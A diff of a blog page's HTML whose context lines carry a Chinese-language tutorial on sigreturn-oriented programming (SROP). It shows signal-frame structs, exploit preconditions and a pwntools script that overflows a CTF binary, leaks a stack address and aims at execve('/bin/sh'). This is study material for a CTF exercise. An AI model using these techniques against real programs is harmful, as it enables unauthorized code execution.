@@ -27,12 +27,12 @@
 
   
   
-    <meta name="description" content="Pwn-SROP Author: 堇姬Naup  signal機制 kernel向process發起signal機制，Process暫時中斷，進入kernel 保存環境(簡單來說就是保存了各個暫存器的值，將所有東西壓入stack，並壓入signal相關訊息)，這段記憶體被稱為Signal Frame 到signal handler處理 恢復環境 繼續執行process  image image s">
+    <meta name="description" content="Pwn-SROP Author: 堇姬Naup  signal機制 kernel向process發起signal機制，Process暫時中斷，進入kernel 保存環境(簡單來說就是保存了各個暫存器的值，將所有東西壓入stack，並壓入signal相關訊息)，這段記憶體被稱為Signal Frame 到signal handler處理 恢復環境 繼續執行process    signal fram">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Pwn-SROP">
 <meta property="og:url" content="http://example.com/2024/08/12/Pwn-SROP/index.html">
 <meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
-<meta property="og:description" content="Pwn-SROP Author: 堇姬Naup  signal機制 kernel向process發起signal機制，Process暫時中斷，進入kernel 保存環境(簡單來說就是保存了各個暫存器的值，將所有東西壓入stack，並壓入signal相關訊息)，這段記憶體被稱為Signal Frame 到signal handler處理 恢復環境 繼續執行process  image image s">
+<meta property="og:description" content="Pwn-SROP Author: 堇姬Naup  signal機制 kernel向process發起signal機制，Process暫時中斷，進入kernel 保存環境(簡單來說就是保存了各個暫存器的值，將所有東西壓入stack，並壓入signal相關訊息)，這段記憶體被稱為Signal Frame 到signal handler處理 恢復環境 繼續執行process    signal fram">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://hackmd.io/_uploads/S17Pv_UB0.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/HyZxuF8rC.png">
@@ -221,11 +221,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -313,12 +313,12 @@
 <li>恢復環境</li>
 <li>繼續執行process</li>
 </ol>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/S17Pv_UB0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S17Pv_UB0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/HyZxuF8rC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyZxuF8rC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><img src="https://hackmd.io/_uploads/S17Pv_UB0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HyZxuF8rC.png" alt="image"></p>
 <p>signal frame</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">      <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">      <span class="type">__uint16_t</span>        swd;</span><br><span class="line">      <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">      <span class="type">__uint16_t</span>        fop;</span><br><span class="line">      <span class="type">__uint64_t</span>        rip;</span><br><span class="line">      <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">      <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">      <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">      <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">__uint64_t</span> r8;</span><br><span class="line">      <span class="type">__uint64_t</span> r9;</span><br><span class="line">      <span class="type">__uint64_t</span> r10;</span><br><span class="line">      <span class="type">__uint64_t</span> r11;</span><br><span class="line">      <span class="type">__uint64_t</span> r12;</span><br><span class="line">      <span class="type">__uint64_t</span> r13;</span><br><span class="line">      <span class="type">__uint64_t</span> r14;</span><br><span class="line">      <span class="type">__uint64_t</span> r15;</span><br><span class="line">      <span class="type">__uint64_t</span> rdi;</span><br><span class="line">      <span class="type">__uint64_t</span> rsi;</span><br><span class="line">      <span class="type">__uint64_t</span> rbp;</span><br><span class="line">      <span class="type">__uint64_t</span> rbx;</span><br><span class="line">      <span class="type">__uint64_t</span> rdx;</span><br><span class="line">      <span class="type">__uint64_t</span> rax;</span><br><span class="line">      <span class="type">__uint64_t</span> rcx;</span><br><span class="line">      <span class="type">__uint64_t</span> rsp;</span><br><span class="line">      <span class="type">__uint64_t</span> rip;</span><br><span class="line">      <span class="type">__uint64_t</span> eflags;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">      <span class="type">__uint64_t</span> err;</span><br><span class="line">      <span class="type">__uint64_t</span> trapno;</span><br><span class="line">      <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">      <span class="type">__uint64_t</span> cr2;</span><br><span class="line">      __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">          <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">          <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">        &#125;;</span><br><span class="line">      <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJ9mSF8HA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJ9mSF8HA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><img src="https://hackmd.io/_uploads/HJ9mSF8HA.png" alt="image"></p>
 <h2 id="漏洞在哪"><a href="#漏洞在哪" class="headerlink" title="漏洞在哪?"></a>漏洞在哪?</h2><p>如果我們能控制Stack的值，因為他在恢復環境時沒有驗證，所以可以任意修改來串ROP(透過偽造sigframe來調用惡意syscall)</p>
 <h2 id="SROP前提"><a href="#SROP前提" class="headerlink" title="SROP前提"></a>SROP前提</h2><ol>
 <li>有BOF</li>
@@ -326,7 +326,7 @@
 <li>&#x2F;bin&#x2F;sh地址可以寫入並拿到該地址或是直接有目標及有位址</li>
 <li>syscall地址</li>
 </ol>
-<h2 id="SROP-chain"><a href="#SROP-chain" class="headerlink" title="SROP chain"></a>SROP chain</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/SJzGDKLS0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJzGDKLS0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h2 id="SROP-chain"><a href="#SROP-chain" class="headerlink" title="SROP chain"></a>SROP chain</h2><p><img src="https://hackmd.io/_uploads/SJzGDKLS0.png" alt="image"></p>
 <p>如果有ret，那可以構造像是這樣的chain來呼叫多個syscall</p>
 <h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ul>
 <li>控制stack</li>
@@ -339,14 +339,14 @@
 <blockquote>
 <p>控rax代表可以控你要syscall甚麼，而能控rax的不只有gadget，read返回值，也就是讀取的字節數可以控rax(rax包含系統調用結果)</p>
 </blockquote>
-<p>首先根據上方asm他調用了read，隨便輸入一個他會跳到對應位置<br><div class="img-item" data-src="https://hackmd.io/_uploads/B13p0arc0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B13p0arc0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>首先根據上方asm他調用了read，隨便輸入一個他會跳到對應位置<br><img src="https://hackmd.io/_uploads/B13p0arc0.png" alt="image"></p>
 <p>這邊我輸入了aaa跳到了0xa616161(0xa是換行)上，因為rsi指向rsp，ret吃到rsp所以stack底部會跳過去</p>
 <p>這邊我先放入兩個ret回最上面</p>
 <p>再來送一個\x03<br>來蓋掉stack底部ret位置最低位到xor rax, rax後面<br>與此同時因為寫入1 byte，rax變成1，call write，寫出stack address</p>
-<p>原本<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkZpU0rcR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkZpU0rcR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>原本<br><img src="https://hackmd.io/_uploads/SkZpU0rcR.png" alt="image"></p>
 <p>寫掉最低位成0x03</p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/BJS1PABqA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJS1PABqA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p>另外因為寫入1 byte ，讓rax&#x3D;1<br><div class="img-item" data-src="https://hackmd.io/_uploads/B1nxwRB9C.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1nxwRB9C.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><img src="https://hackmd.io/_uploads/BJS1PABqA.png" alt="image"></p>
+<p>另外因為寫入1 byte ，讓rax&#x3D;1<br><img src="https://hackmd.io/_uploads/B1nxwRB9C.png" alt="image"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc lotuxctf.com 10009&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p</span>():</span><br><span class="line">    gdb.attach(proc.pidof(r)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0x401000</span>)+p64(<span class="number">0x401000</span>)</span><br><span class="line"></span><br><span class="line">r.send(payload1)</span><br><span class="line"></span><br><span class="line">p()</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;\x03&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak_stack_base = u64(r.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAK STACK&#x27;</span>,<span class="built_in">hex</span>(leak_stack_base))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>接下來我們的目標是call execve()，所以要寫入&#x2F;bin&#x2F;sh<br>另外根據上方腳本已經跳出去了，但我們如果一開始送p64(0x401000) 3次，write完後又跳回來了</p>
@@ -463,7 +463,7 @@
     
       <div>
         <span class="icon-brush"></span>
-        149.8k
+        149.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         13:10
@@ -515,11 +515,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -644,7 +644,7 @@
           url: "http://example.com/2024/08/12/Pwn-SROP/",
           excerpt: "",
           description: "",
-          stripContent: "Pwn-SROP Author: 堇姬Naup  signal機制 kernel向process發起signal機制，Process暫時中斷，進入kernel 保存環境(簡單來說就是保存了各個暫存器的值，將所有東西壓入stack，並壓入signal相關訊息)，這段記憶體被稱為Signal Frame 到signal handler處理 恢復環境 繼續執行process  image image signal frame 12345678910111213141516171819202122232",
+          stripContent: "Pwn-SROP Author: 堇姬Naup  signal機制 kernel向process發起signal機制，Process暫時中斷，進入kernel 保存環境(簡單來說就是保存了各個暫存器的值，將所有東西壓入stack，並壓入signal相關訊息)，這段記憶體被稱為Signal Frame 到signal handler處理 恢復環境 繼續執行process    signal frame 123456789101112131415161718192021222324252627282",
           date: "Mon Aug 12 2024 19:32:55 GMT+0800",
           updated: "Mon Aug 12 2024 19:33:27 GMT+0800",
           cover: "/images/banner.webp",
